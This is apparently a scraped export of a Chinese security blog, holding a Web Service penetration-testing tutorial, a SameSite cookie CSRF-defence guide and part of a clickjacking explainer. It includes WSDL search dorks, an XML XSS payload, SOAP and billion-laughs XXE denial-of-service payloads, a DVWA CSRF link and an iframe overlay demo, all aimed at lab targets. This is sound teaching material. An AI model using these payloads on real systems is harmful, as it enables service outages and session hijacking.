[Buffer Overrun In RPC Interface] (/NT/2000/XP/2003) 0x03 MS11-080示例这里以MS11-080为例演示。从前面的图看到是存在KB2592799补丁是不存在的，即存在MS11-080漏洞。 利用工具：https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080 这里本地环境限制，借用Mirco8的图：","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"},{"name":"提权","slug":"提权","permalink":"https://www.mi1k7ea.com/tags/提权/"}]},{"title":"Web Service渗透测试","date":"2021-01-16T06:58:45.000Z","path":"2021/01/16/Web-Service渗透测试/","text":"0x00 前言内部是没有Web Service特别是SOAP型这块资料的，于此补充一下。 0x01 Web Service基础Web Service简介Web Service是一个平台独立的、低耦合的、自包含的、基于可编程的Web的应用程序，可使用开放的XML（标准通用标记语言下的一个子集）标准来描述、发布、发现、协调和配置这些应用程序，用于开发分布式的交互操作的应用程序。 Web Service技术， 能使得运行在不同机器上的不同应用无须借助附加的、专门的第三方软件或硬件， 就可相互交换数据或集成。依据Web Service规范实施的应用之间， 无论它们所使用的语言、 平台或内部协议是什么， 都可以相互交换数据。Web Service是自描述、 自包含的可用网络模块， 可以执行具体的业务功能。Web Service也很容易部署， 因为它们基于一些常规的产业标准以及已有的一些技术，诸如标准通用标记语言下的子集XML、HTTP。Web Service减少了应用接口的花费。Web Service为整个企业甚至多个组织之间的业务流程的集成提供了一个通用机制。 网Web Service的本质，就是通过网络调用其他网站的资源。Web Service架构的基本思想，就是尽量把非核心功能交给其他人去做，自己全力开发核心功能。 更简单地说，Web Service是一种跨编程语言、跨操作系统平台的远程调用技术。 Web Service基本原理Web Service通过HTTP协议发送请求和接收结果时，发送的请求内容和结果内容都采用XML格式封装，并增加了一些特定的HTTP消息头，以说明HTTP消息的内容格式，这些特定的HTTP消息头和XML内容格式就是SOAP协议规定的。 Web Service服务器端首先要通过一个WSDL文件来说明自己有什么服务可以对外调用。WSDL就像是一个说明书，用于描述Web Service及其方法、参数和返回值。WSDL文件保存在Web服务器上，通过一个URL地址就可以访问到它。客户端要调用一个Web Service服务之前，要知道该服务的WSDL文件的地址。Web Service服务提供商可以通过两种方式来暴露它的WSDL文件地址：1.注册到UDDI服务器，以便被人查找；2.直接告诉给客户端调用者。 Web Service交互的过程就是，Web Service遵循SOAP协议通过XML封装数据，然后由HTTP协议来传输数据。 Web Service分类一般的，Web Service分为： SOAP型Web Service：SOAP型Web Service允许使用XML格式与服务器进行通信； REST型Web Service：REST型Web Service允许使用JSON格式（也可以使用XML格式）与服务器进行通信。与HTTP类似，该类型服务支持GET、POST、PUT、DELETE方法。不需要WSDL、UDDI； Web Service三要素Web Service三要素包括SOAP（Simple Object Access Protocol）、WSDL（WebServicesDescriptionLanguage）、UDDI（UniversalDescriptionDiscovery andIntegration）。其中SOAP用来描述传递信息的格式， WSDL用来描述如何访问具体的接口， UDDI用来管理、分发、查询Web Service 。 Web Service相关技术SOAPSOAP（Simple Object Access Protocol）简单对象访问协议是交换数据的一种协议规范，是一种轻量的、简单的、基于XML（标准通用标记语言下的一个子集）的协议，它被设计成在WEB上交换结构化的和固化的信息。SOAP不是Web Service的专有协议。 SOAP使用HTTP来发送XML格式的数据，可以简单理解为：SOAP = HTTP +XML SOAP结构如图： 包括以下元素： 必需的 Envelope 元素，可把此 XML 文档标识为一条 SOAP 消息 可选的 Header 元素，包含头部信息 必需的 Body 元素，包含所有的调用和响应信息 可选的 Fault 元素，提供有关在处理此消息所发生错误的信息 RESTREST（Representational State Transfer）即表述性状态传递，是Roy Fielding博士在2000年他的博士论文中提出来的一种软件架构风格。它是一种针对网络应用的设计和开发方式，可以降低开发的复杂性，提高系统的可伸缩性。 REST是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是RESTful。需要注意的是，REST是设计风格而不是标准。REST通常基于使用HTTP，URI，和XML（标准通用标记语言下的一个子集）以及HTML（标准通用标记语言下的一个应用）这些现有的广泛流行的协议和标准。 在三种主流的Web服务实现方案中，因为REST模式的Web服务与复杂的SOAP和XML-RPC对比来讲明显的更加简洁，越来越多的Web服务开始采用REST风格设计和实现。例如，Amazon.com提供接近REST风格的Web服务进行图书查找；雅虎提供的Web服务也是REST风格的。 WSDLWSDL（Web Services Description Language）即网络服务描述语言，用于描述Web服务的公共接口。这是一个基于XML的关于如何与Web服务通讯和使用的服务描述；也就是描述与目录中列出的Web服务进行交互时需要绑定的协议和信息格式。通常采用抽象语言描述该服务支持的操作和信息，使用的时候再将实际的网络协议和信息格式绑定给该服务。 WSDL给出了SOAP型Web Service的基本定义，WSDL基于XML语言，描述了与服务交互的基本元素，说明服务端接口、方法、参数和返回值，WSDL是随服务发布成功，自动生成，无需编写。少数情况下，WSDL也可以用来描述REST型Web Service。SOAP也是基于XML（标准通用标记语言下的一个子集）和XSD的，XML是SOAP的数据编码方式。 WADLWADL（Web Application Description Language）即Web应用程序描述语言，是一个可用计算机处理的表达基于HTTP的Web应用（如RESTWeb服务）的XML词汇。WADL描述了Web服务提供的资源及他们的联系。WADL试图简化重用基于HTTP架构的Web服务。它是一个平台，且与语言无关，并试图推动除Web浏览器的基本使用外的应用重用。 WADL于2009年8月31日由Sun微系统提交至万维网联盟，但联盟目前没有标准化它的计划并且它并没有被广泛地支持。WADL依照描述基于SOAP的RPC式服务的XML词汇WSDL定义，用于描述REST服务，而WSDL也可用于描述RESTWeb服务。 WADL主要用于REST基础。 WADL与WSDL的区别： WSDL是面向接口的描述，WADL是面向资源的描述； WADL是基于HTTP的，WSDL 2.0是接口独立的； UDDIUDDI（Universal Description Discovery and Integration）即统一描述、发现和集成，是一种用于描述、发现、集成Web Service的技术，它是Web Service协议栈的一个重要部分。通过UDDI，企业可以根据自己的需要动态查找并使用Web服务，也可以将自己的Web服务动态地发布到UDDI注册中心，供其他用户使用。 UDDI是核心的Web服务标准之一。它通过SOAP进行消息传输，用Web服务描述语言描述Web服务及其接口使用。 SOAP型Web Service服务架构如图，Web Service服务提供方将自己的Web服务通过SOAP动态地发布到UDDI注册中心，其中是以WSDL文件来进行描述，Web Service服务消费方先向UDDI注册中心通过SOAP请求WSDL文件回来解析服务提供方提供哪些方法后，再和提供方建立XML格式的HTTP通信： WSDL文档结构WSDL文档结构如下，以本地WSDL文档为例，： 标签说明： definitions：所有WSDL文档的根元素都是definitions元素； types：数据类型(标签)定义的容器，里面使用schema定义了一些标签结构供message引用 ； message：通信消息的数据结构的抽象类型化定义。引用types中定义的标签； operation：对服务中所支持的操作的抽象描述，一个operation描述了一个访问入口的请求消息与响应消息对； portType：对于某个访问入口点类型所支持的操作的抽象集合，这些操作可以由一个或多个服务访问点来支持； binding：特定端口类型的具体协议和数据格式规范的绑定； service：相关服务访问点的集合； port：定义为协议/数据格式绑定与具体Web访问地址组合的单个服务访问点； 那么我们一般如何阅读WSDL文件呢？——WSDL文档都是从下往上阅读的。 先看最底下的service标签，查看其中port标签的binding属性值，然后通过值查找上面的binding标签： 通过binding标签可以获得具体协议等信息，然后查看binding的type属性： 通过binding的type属性，查找对应的portType，可以获得可操作的方法和参数、返回值等： 通过portType下的operation标签的message属性，可以向上查找message获取具体的数据参数： 0x02 编写Web Service程序简单看下各语言怎么编写Web Service程序。 Java版编写接口类ICalculator，其中声明两个方法，注意接口要用@WebService修饰： 123456789package com.mi1k7ea;import javax.jws.WebService;@WebServicepublic interface ICalculator &#123; int add(int a, int b); String concat(String a, String b);&#125; 编写接口实现类CalculatorImpl，其中重写实现两个方法，在@WebService修饰中指定端点接口为com.mi1k7ea.ICalculator且服务名为Calcutator： 12345678910111213141516package com.mi1k7ea;import javax.jws.WebService;@WebService(endpointInterface = \"com.mi1k7ea.ICalculator\", serviceName = \"Calcutator\")public class CalculatorImpl implements ICalculator &#123; @Override public int add(int a, int b) &#123; return a + b; &#125; @Override public String concat(String a, String b) &#123; return a + b; &#125;&#125; 编写Web Service服务端，通过Endpoint.publish()函数来发布指定地址上的Web Service服务： 123456789101112131415import com.mi1k7ea.CalculatorImpl;import javax.xml.ws.Endpoint;public class WebService &#123; public static void main(String[] args) &#123; System.out.println(\"[*]Start Web Service...\"); CalculatorImpl calculator = new CalculatorImpl(); String address = \"http://127.0.0.1:8081/calculator\"; Endpoint.publish(address, calculator); System.out.println(\"[*]Web Service is working...\"); &#125;&#125; 运行服务即可访问： PHP版参考：https://github.com/snoopysecurity/dvws NodeJS版参考：https://github.com/snoopysecurity/dvws-node .Net版参考：https://xz.aliyun.com/t/7541#toc-4 0x03 搜索Web Service服务Google Hack1234567891011121314151617181920212223filetype:asmx inurl:(_vti_bin | api | webservice | ws )allinurl:dll?wsdl filetype:dllinurl:jws?wsdlinurl:asmx?wsdlinurl:aspx?wsdlinurl:ascx?wsdlinurl:ashx?wsdlinurl:dll?wsdlinurl:exe?wsdlinurl:php?wsdlinurl:pl?wsdlinurl:?wsdlfiletype:jwsfiletype:asmxfiletype:ascxfiletype:aspxfiletype:ashxfiletype:dllfiletype:exefiletype:phpfiletype:plfiletype:wsdl 通过代理流量筛选可以在如BurpSuite这种代理工具中设定的过滤规则来筛选Web Service请求。比如“.dll?wsdl”、“.ashx?wsdl”、“.exe?wsdl”、“.php?wsdl”等。 Fuzz… 0x04 针对Web Service的渗透测试Web Service服务也是一些包装过的接口而已，针对Web Service服务的渗透测试和对常规API渗透测试是一样的、只是，可以使用安全工具来辅助进行，包括但不限于如下的工具： WebScarap SoapUI WCFStorm SOA Cleaner WSDigger wsScanner Wfuzz RESTClient BurpSuite WS-Attacker ZAP Metasploit WSDL Analyze 这里主要讲下如何使用BurpSuite和ReadAPI/SoapUI这两个工具来对Web Service服务进行渗透服务。 ReadyAPI+BurpSuite网上的资料都是说的用SoapUI NG Pro+BurpSuite组合进行Web Service的渗透测试，但是现在SoapUI NG Pro试用版的下载已经更名为ReadyAPI了。 下载地址：https://smartbear.com/product/ready-api/api-functional-testing/free-trial/ 整个过程如图： 其实就是SoapUI NG Pro作为Web Service的测试工具，Burp作为代理、监听SoapUI NG Pro用自己构造的payload报文打Web Service的流量报文，其中可以篡改对应的报文参数实现渗透测试。 这里本地以ReadyAPI为例。 先设置Burp代理，在File-&gt;Preferences-&gt;Proxy中设置Burp代理服务器地址： 然后新建安全测试任务，选择WSDL相关的API模块定义： 填写目标Web Service的WSDL地址，这里以前面编写的Demo为例： 点击Next，当WSDL解析完成后，会自动生成一系列的安全测试用例，默认都选上安全测试用例，点击Finish，然后运行测试用例： 扫描完成之后会给出扫描总结报告、还提供PDF版详细报告供查阅： 此时Burp中已经监听到了大量ReadAPI安全测试用例的报文，只需要将对应的报文放到Repeater中修改参数值继续进行渗透测试或者发到Intruder中进行Fuzzing即可： 后面就是针对常见API接口安全的渗透测试了，套路都是一样的。 SoapUI+BurpSuite当使用没有安全测试用例扫描功能的SoapUI时，也可以用来生成对应格式的报文给Burp进行手工渗透测试。 这里以SoapUI Pro为例，前面的设置操作都是和ReadyAPI一样，只是没有了安全测试用例扫描功能而已。 设置好Burp代理，新建SOAP项目，填入WSDL地址完成解析后会显示如下图左边所有的Web Service服务和方法，其中可以单个填入参数值发送对应的请求报文并获取结果回显到界面中： 这里Burp监听到该报文，只需要修改参数值，而无须构造XML格式： 后面就是针对常见API接口安全的渗透测试了，套路都是一样的。 BurpSuite插件之WslderWslder是BurpSuite，其在Extender的BApp Store中可以直接下载安装。虽然比前面的方法简便，但是有时候生成的请求会存在问题导致无法成功发包，此时就需要用到前面的方法了。 安装成功后，在Requests中右键选中Parse WSDL就能直接用了： 解析WSDL完成之后，在Wsdler栏可以看到解析出来对应的Web Service服务和方法以及对应的请求参数样例等，直接修改对应的参数值即可进行渗透测试： 0x05 Web Service漏洞案例SOAP型Web Service漏洞和Web漏洞并没有区别，只是请求的payload构造需要满足一些格式要求而已，具体还是要看Web Service服务端代码是怎么写的。比如命令注入、SQL注入、XSS、XXE、XPath注入、DoS、逻辑漏洞、信息泄露…等等。 这里以DVWS靶场为例演示几个SOAP类型Web Service请求的漏洞利用。 XSS换SOAP请求攻击时，注意点就是在SOAP中XSS payload的尖括号要进行HTML编码，不然会造成SOAP标签解析错误从而报错： 此外，一般Web Service服务站点也是支持上传XML文件的，这里就可以使用xhtml来触发XML XSS： 123456&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;xhtml:html xmlns:xhtml=\"http://www.w3.org/1999/xhtml\"&gt;&lt;xhtml:script&gt; alert(document.location) &lt;/xhtml:script&gt;&lt;/xhtml:html&gt; XXE回显型XXE，注意exp的XML内容要写在SOAP的前面才能正常解析利用： 任意用户枚举就是常规的API逻辑漏洞而已，利用响应结果二元组来推断： express-fileupload原型链污染攻击有意思的是，这里有个express-fileupload &lt; 1.1.10版本的原型链污染漏洞，可导致DoS（某些情况下可导致任意代码执行）： DoSWeb Service服务的交互很多都是用的XML格式数据。请求中的XML数据会由服务端的XML解析器进行解析和处理。 目前主要有两类XML解析器： 基于SAX（Simple API for XML）的XML解析器：内存中最多容纳2个元素。在这种情况下，基于SAX的解析器不会存在DoS问题； 基于DOM（Document Object Model）的XML解析器：会一次性读取客户端存储的所有XML数据，因此会导致内存中存在庞大的对象数据从而导致存在DoS问题。漏洞根源在于没有检查XML中节点的大小和数量； 针对元素名称的DoS攻击的示例： 12345678&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;TEST&gt;&lt;BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA………BGABGABGABGABGABGABGABGABGABGA&gt;&lt;/TEST&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 针对元素属性的DoS攻击的示例： 12345678&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;TEST&gt;&lt;BGA attribute=”BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA………BGABGABGABGABGABGABGABGABGABGA”&gt;&lt;/BGA&gt;&lt;/TEST&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 针对元素个数的DoS攻击的示例（也可以通过重复某个特定元素达到同样效果）： 12345678&lt;soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"&gt;&lt;soapenv:Header/&gt;&lt;soapenv:Body&gt;&lt;TEST&gt;&lt;BGA attribute1=”BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA...BGABGABGABGABGABGABGABGABGABGA” attribute2=”BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA...BGABGABGABGABGABGABGABGABGABGA” attribute3=”BGABGABGABGABGABGABGABGABGABGABGABGABGABGABGABGA...BGABGABGABGABGABGABGABGABGABGA”&gt;&lt;/BGA&gt;&lt;/TEST&gt;&lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt; 当然，存在XXE时，就可以进行XXE DoS攻击： 1234567891011&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE bga [&lt;!ELEMENT ANY &gt;&lt;!ENTITY bga1 &quot;bga1&quot;&gt;&lt;!ENTITY bga2 &quot;&amp;bga1;&amp;bga1;&amp;bga1;&amp;bga1;&amp;bga1;&amp;bga1;&quot;&gt;&lt;!ENTITY bga3 &quot;&amp;bga2;&amp;bga2;&amp;bga2;&amp;bga2;&amp;bga2;&amp;bga2;&quot;&gt;&lt;!ENTITY bga4 &quot;&amp;bga3;&amp;bga3;&amp;bga3;&amp;bga3;&amp;bga3;&amp;bga3;&quot;&gt;&lt;!ENTITY bga5 &quot;&amp;bga4;&amp;bga4;&amp;bga4;&amp;bga4;&amp;bga4;&amp;bga4;&quot;&gt;&lt;!ENTITY bga6 &quot;&amp;bga5;&amp;bga5;&amp;bga5;&amp;bga5;&amp;bga5;&amp;bga5;&quot;&gt;]&gt;&lt;bga&gt;&amp;bga6;&lt;/bga&gt; 0x06 参考使用Burp Suite测试Web Services服务 浅析接口安全之WebService 【技术分享】Web Service 渗透测试从入门到精通","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Web Service","slug":"Web-Service","permalink":"https://www.mi1k7ea.com/tags/Web-Service/"}]},{"title":"杜绝CSRF的方案：SameSite cookies","date":"2021-01-16T06:55:29.000Z","path":"2021/01/16/杜绝CSRF的方案：SameSite-cookies/","text":"0x00 前言上周和小伙伴讨论了产品线没法快速完成一套Anti-CSRF Token机制来防御CSRF，因为涉及到的改动较大，这里校验Referer头也是存在被绕过的风险的，因此基于此场景给产品线提出SameSite cookies的安全解决方案来杜绝CSRF。 0x01 SameSite众所周知，正是Cookie的滥用，才导致了CSRF漏洞的存在。 在Cookie出现SameSite属性之前，针对CSRF攻击的防御措施都是基于Anti-CSRF Token机制或者校验Referer头字段。 从Chrome 51开始，浏览器的Cookie新增加了一个SameSite属性，用来防止CSRF攻击和用户追踪（当然也能防御XSSI）。 SameSite 是HTTP响应头 Set-Cookie 的属性之一。它允许您声明该Cookie是否仅限于第一方或者同一站点上下文。 其中可以设置如下三个属性值： Strict Lax None StrictStrict最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。 1Set-Cookie: CookieName=CookieValue; SameSite=Strict; 这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。 LaxLax规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。 1Set-Cookie: CookieName=CookieValue; SameSite=Lax; 导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。 请求类型 示例 正常情况 Lax 链接 &lt;a href=&quot;...&quot;&gt;&lt;/a&gt; 发送 Cookie 发送 Cookie 预加载 &lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt; 发送 Cookie 发送 Cookie GET 表单 &lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt; 发送 Cookie 发送 Cookie POST 表单 &lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt; 发送 Cookie 不发送 iframe &lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt; 发送 Cookie 不发送 AJAX $.get(&quot;...&quot;) 发送 Cookie 不发送 Image &lt;img src=&quot;...&quot;&gt; 发送 Cookie 不发送 设置了Strict或Lax以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。 NoneChrome 计划将Lax变为默认设置。这时，网站可以选择显式关闭SameSite属性，将其设为None。不过，前提是必须同时设置Secure属性（Cookie 只能通过 HTTPS 协议发送），否则无效。 下面的设置无效。 1Set-Cookie: widget_session=abc123; SameSite=None 下面的设置有效。 1Set-Cookie: widget_session=abc123; SameSite=None; Secure 0x02 各版本浏览器支持情况SameSite的由于是后来的产物，因此其不足之处在于不同浏览器支持的情况各异。 如图： 具体情况可看：https://caniuse.com/?search=SameSite 0x03 安全整改建议一般而言，对于业务来说是建议设置SameSite属性值为Lax的，因为Strict太影响用户体验。 Lax对GET请求是放行的，因此整改的重点在于要严格区分GET和POST的职责，即GET只能进行一些查询类或导航类的访问、而不是进行状态更改，要执行一些更改类的表单操作就必须交由POST来处理，在这种场景下Lax的设置才会将风险降到较低。这是因为： 如果用GET携带参数访问，其中的参数值将会记录在浏览器历史、Web日志以及访问其他页面的Referer头字段中； Cookie的SameSite属性设置为Lax的GET请求还是会被攻击者利用进行CSRF攻击，且GET型CSRF攻击难度低； 除此之外，还需要考虑客户端使用的浏览器版本过低或者非常见浏览器使得SameSite失效的问题。 当然，结合其他的Cookie头字段设置可以达到更高的安全性，可参考：https://scotthelme.co.uk/tough-cookies/ 0x04 各语言设置SameSite例子设置SameSite其实就是对响应报文Set-Cookie头加上对应的SameSite属性键值对而已，这里只给出几种最常用的Web开发语言的设置示例。 其他类型语言可以参考：https://github.com/GoogleChromeLabs/samesite-examples Java设置SameSite在Java Web中，使用setHeader()直接添加对应的Set-Cookie头的值即可： 1234567891011boolean firstHeader = true;for (String header : cookiesHeaders) &#123; if (firstHeader) &#123; httpResponse.setHeader(\"Set-Cookie\", String.format(\"%s; %s\", header, \"SameSite=Strict\")); firstHeader = false; continue; &#125; httpResponse.addHeader(\"Set-Cookie\", String.format(\"%s; %s\", header, \"SameSite=Strict\"));&#125; PHP设置SameSitePHP &gt;= 7.3 版本PHP 7.3及以上版本的setcookie()函数已经支持samesite属性，并且允许None为有效值。 1234// Set a same-site cookie for first-party contextssetcookie('cookie1', 'value1', ['samesite' =&gt; 'Lax']);// Set a cross-site cookie for third-party contextssetcookie('cookie2', 'value2', ['samesite' =&gt; 'None', 'secure' =&gt; true]); PHP &lt; 7.3 版本在低版本PHP中，可以直接通过header()函数设置Set-Cookie头的值来设置samesite： 1234// Set a same-site cookie for first-party contextsheader('Set-Cookie: cookie1=value1; SameSite=Lax', false);// Set a cross-site cookie for third-party contextsheader('Set-Cookie: cookie2=value2; SameSite=None; Secure', false); Session Cookie对于Session Cookie，可以在session_set_cookie_params()方法中设置。PHP 7.3.0为samesite引入了新属性： 123456789101112131415161718if (PHP_VERSION_ID &gt;= 70300) &#123; session_set_cookie_params([ 'lifetime' =&gt; $cookie_timeout, 'path' =&gt; '/', 'domain' =&gt; $cookie_domain, 'secure' =&gt; $session_secure, 'httponly' =&gt; $cookie_httponly, 'samesite' =&gt; 'Lax']);&#125; else &#123; session_set_cookie_params( $cookie_timeout, '/; samesite=Lax', $cookie_domain, $session_secure, $cookie_httponly);&#125; Python设置SameSitePython原生在Python 3.8中http.cookie已支持SameSite属性。 低于该版本的需要直接在setcookie中设置。 Flask框架第一种方式： 123456789101112from flask import Flask, make_responseapp = Flask(__name__)@app.route('/')def hello_world(): resp = make_response('Hello, World!') # Set a same-site cookie for first-party contexts resp.set_cookie('cookie1', 'value1', samesite='Lax') # Set a cross-site cookie for third-party contexts resp.set_cookie('cookie2', 'value2', samesite='None', secure=True) return resp 如果上述报错，可替换如下第二种方式： 12345678910111213from flask import Flask, make_responseapp = Flask(__name__)@app.route('/')def hello_world(): resp = make_response('Hello, World!') # Set a same-site cookie for first-party contexts resp.set_cookie('cookie1', 'value1', samesite='Lax') # Ensure you use \"add\" to not overwrite existing cookie headers # Set a cross-site cookie for third-party contexts resp.headers.add('Set-Cookie','cookie2=value2; SameSite=None; Secure') return resp 0x05 实践效果测试以DVWA的Low级别CSRF靶场为效果测试Demo。 默认情况下，登录成功之后，在Chrome中看到Cookie中各项值的SameSite是空的： 在Low级中，CSRF是GET型的，可以用如下PoC打： 1&lt;a href=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=mi1k7ea&amp;password_conf=mi1k7ea&amp;Change=Change\"&gt;Click me&lt;/a&gt; 修改DVWA代码中设置Cookie的地方，以前面PHP Session Cookie的方式只给PHPSESSID部分添加SameSite属性，值为Strict： 此时再登录就看到对应的Cookie值PHPSESSID被设置了SameSite属性： 此时再用前面的PoC打，是失败的即重定向到login页面，看到发起CSRF攻击的Cookie只是带了security属性值并没有PHPSESSID的属性值，被SameSite成功防御住了： 但是，如果这种业务场景下设置SameSite为Lax的话，是不会拦截GET型CSRF的： 因此，需要根据产品自身的业务场景来决定采用Strict或Lax。 0x06 参考Cookie 的 SameSite 属性","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"CSRF","slug":"CSRF","permalink":"https://www.mi1k7ea.com/tags/CSRF/"}]},{"title":"浅析界面操作劫持攻击","date":"2021-01-16T06:49:10.000Z","path":"2021/01/16/浅析界面操作劫持攻击/","text":"0x00 前言完善wiki知识库。 0x01 界面操作劫持简介界面操作劫持是一种基于视觉欺骗的Web会话劫持攻击，通过在网页的可见输入控件上覆盖一个不可见的框（iframe），使得用户误以为在操作可见控件，而实际上用户的操作行为被其不可见的框所劫持，执行不可见框中的恶意劫持代码，从而完成在用户不知情的情况下窃取敏感信息、篡改数据等攻击。 界面操作劫持实际上是突破了CSRF的防御策略，是一种社工型跨域操作，而这种跨域正是浏览器自身的特性。 基础技术界面劫持技术的基础就是前面提到的”覆盖一个不可见的框”，可以理解为：透明层 + iframe 通过页面透明层+iframe实现了对用户的视觉欺骗，即用户看到的操作对象和实际操作对象是不一致的，从而为界面操作劫持攻击提供了技术手段。 透明层使用CSS样式实现对于IE浏览器 &lt;= 8版本，使用的私有CSS透明属性如下，数值从0-100，数值越小透明度越高： 1filter:Alpha(opacity=50); 对于Chrome、Firefox、Safari、Opera这四款浏览器以及IE浏览器 &gt; 8版本使用的CSS透明属性如下，数值从0-1，数值越小透明度越高： 1opacity: 0.5; 控件位置之间的层次关系使用z-index，任何浏览器均支持，其数值可以为负数，高数值的控件会处于低数值控件的前面，数值越高、控件越靠近用户： 1z-index: 2; 使用iframe来嵌入被劫持的页面代码如下，其中scrolling属性设置为no即不在iframe中显示滚动条： 1&lt;iframe id=\"victim\" src=\"http://www.victim.com\" scrolling=\"no\"&gt;&lt;/iframe&gt; 攻击前提目标页面未设置X-Frame-Options头进行防御。 分类界面操作劫持攻击可分为以下三种： 点击劫持（ClickJacking）； 拖放劫持（Drag&amp;Drop Jacking）； 触屏劫持（TapJacking）； 0x02 点击劫持（ClickJacking）简介这种攻击方式首先劫持的是用户的鼠标点击操作，因此才被命名为点击劫持。点击劫持主要的劫持目标是有重要会话交互的页面，比如用户的后台管理页面、银行交易页面或劫持用户的麦克风和摄像头等。 更简单地说，点击劫持就是利用社工搭配目标站的不安全配置对用户造成危害。 Demo点击劫持的原理就是直接利用前面说到的透明层+iframe来实现的。 一个简单的Demo，clickjacking.html是一个用户可见的伪装页面，在其页面中设置iframe所在层为透明层，并在iframe中嵌套了inner.html页面，其中设计Click me按钮和Login按钮的位置重合，为了方便查看两个页面的嵌套情况就将opacity设置为0.5： 12345678910111213141516171819&lt;style&gt;#click&#123; width: 100px; top: 20px; left: 20px; position: absolute; z-index: 1&#125;#hidden&#123; height: 50px; width: 120px; position: absolute; filter: alpha(opacity=50); opacity: 0.5; z-index: 2&#125;&lt;/style&gt;&lt;input id=\"click\" value=\"Click me\" type=\"button\"/&gt;&lt;iframe id=\"hidden\" src=\"inner.html\" scrolling=\"no\"&gt;&lt;/iframe&gt; inner.html： 1&lt;input style=\"width: 100px;\" value=\"Login\" type=\"button\" onClick=\"alert('ClickJackingTest')\"/&gt; 当用户以为在点击clickjacking.html页面的Click me按钮时，实际上点击的是inner.html页面上的Login按钮： 0x03 拖放劫持（Drag&amp;Drop Jacking）简介在2010的Black Hat Europe大会上，Paul Stone提出了点击劫持的技术演进版本：拖放劫持。由于用户需要用鼠标拖放完成的操作越来越多（如复制粘贴、小游戏等等），拖放劫持大大提高了点击劫持的攻击范围，将劫持模式从单纯的鼠标点击拓展到了鼠标拖放行为。 更重要的是，由于拖放操作不受浏览器“同源策略“影响，用户可以把一个域的内容拖放到另一个不同的域，由此突破SOP限制的拖放劫持可以演化出更广泛的攻击形式、突破很多种防御。比如攻击者可能通过劫持某个页面的拖放操作实现对其他页面链接的窃取，从而获得session key、token、password等敏感信息，甚至能将浏览器中的页面内容拖进文本编辑器，查看源代码。 2011年出现的CookieJacking攻击就是拖放攻击的代表，此攻击的成因是由于本地Cookie可以用标签嵌入，进而就可以利用拖放劫持来盗取用户的Cookie。在JavaScript或者Java API的支持下，这个攻击过程会变得非常隐蔽。因为它突破了传统ClickJacking一些先天的局限，所以这种新型的”拖拽劫持”能够造成更大的破坏。 dataTransfer对象拖放劫持相比点击劫持的技术演进在于还需要一种数据传递的方法才能真正达到攻击效果。为了能协助拖放操作传递数据，在IE 5.0之后引入了dataTransfer对象，其作为event对象的一个属性出现，用于从被拖动的对象传递字符串到放置对象。 dataTransfer对象定义了两个主要方法：getData和setData 语句如下： 1234event.dataTransfer.setData(\"text\", \"sometext\");event.dataTransfer.setData(\"URL\", \"https://www.mi1k7ea.com\");var url = event.dataTransfer.getData(\"URL\");var text = event.dataTransfer.getData(\"text\"); setData操作完成向系统剪贴板中存储需要传递的数据，传递数据分为两种类型：文本数据和URL数据。在HTML5扩展中，其允许指定任意的MIME类型。 getData操作完成获取有setData所存储的数据。 本地测试例子： 123var dataTrans = new DataTransfer();dataTrans.setData(\"text\", \"This is test.\");var text = dataTrans.getData(\"text\"); dataTransfer对象和操作方法为跨域传送数据提供了有效的技术手段。 拖放函数掌握视觉欺骗手段和数据传递方法之后，接下来要做的就是确定需要劫持的操作函数。 在HTML5中，用户在整个拖放过程中会依次触发相应的操作函数。 当鼠标拖动了一个控件，源对象将依次触发以下函数： ondrag：在从drag动作开始，到drop动作结束的过程中，源对象触发的一个事件； ondragstart：源对象开始拖放，开始移动时事件触发； ondragend：源对象拖放结束，整个拖放操作结束时触发； 当拖动对象到一个有效的目标上时，目的对象将依次触发以下函数： ondragenter：源对象进入过程对象范围内，被拖拽对象进入过程对象时被触发； ondragover：源对象在过程对象范围内移动，被拖拽对象在过程对象内移动时触发； ondragleave：源对象离开过程对象的范围，被拖拽对象离开目标对象时触发； ondrop：源对象拖放到目标对象中，目标对象完全接受被拖拽对象时触发，可理解为在目标对象内松手时触发； Demo参考并稍微修改了下书上的例子。 drag_jacking.html： 